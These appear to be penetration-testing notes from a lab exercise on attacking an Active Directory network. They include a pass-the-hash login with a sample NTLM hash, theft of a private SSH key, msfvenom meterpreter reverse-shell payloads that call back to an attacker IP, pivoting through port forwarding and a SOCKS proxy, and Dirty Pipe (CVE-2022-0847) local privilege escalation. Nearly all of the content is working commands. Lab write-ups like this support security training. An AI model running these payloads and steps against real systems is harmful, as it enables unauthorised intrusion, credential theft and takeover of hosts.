## Domain Password Analysis - Cracking NTDS

Statistic for domain password analysis tool: https://github.com/clr2of8/DPAT

- Number of password hashes obtained
- Number of password hashes cracked
- Percent of password hashes cracked
- Top 10 passwords
- Passowrd length breakdown
- Number of Domain Admin passwords cracked
- Number of Enterprise Admin passwords cracked

## Active Directory Security Audit

https://www.pingcastle.com/

## Hunting for Sensitive Data/Hosts
```
sudo proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
cd C:\Department Shares\IT\Private\Networking
ipconfig /all
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```
- 172.16.9.25 found

**Download SSH key
```
download "C:\Department` Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa
```

Double hop problem (host -> dmz01 -> DC01 -> MGMT01), so let's set up a reverse shell on dmz01
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.15.120
set LPORT 443
exploit
chmod +x shell.elf
./shell.elf
```

**Setup local port forwarding rule to forward all traffic destined to port 1234 on dmz01 to port 8443 on our attack host
```
portfwd add -R -l 8443 -p 1234 -L 10.10.15.120
```

**Create payload to upload to DC
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
upload "/home/htb-ac-1480826/dc_shell.exe"
bg
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 8443
exploit
.\dc_shell.exe
run autoroute -s 172.16.9.0/23
background
route print
use auxiliary/server/socks_proxy
set srvport 9050
set version 4a
run
sudo proxychains nmap -sT -p 22 172.16.9.25
sudo proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```


## Privilege escalation
```
uname -a
```
- https://www.cisa.gov/uscert/ncas/current-activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux
- https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

Paste code in file using vim
```
gcc exploit.c -o dirtypipe
chmod +x dirtypipe
./dirtypipe 
```

If it says we need a SUID:
```
find / -perm -4000 2>/dev/null
./dirtypipe /usr/lib/openssh/ssh-keysign
```

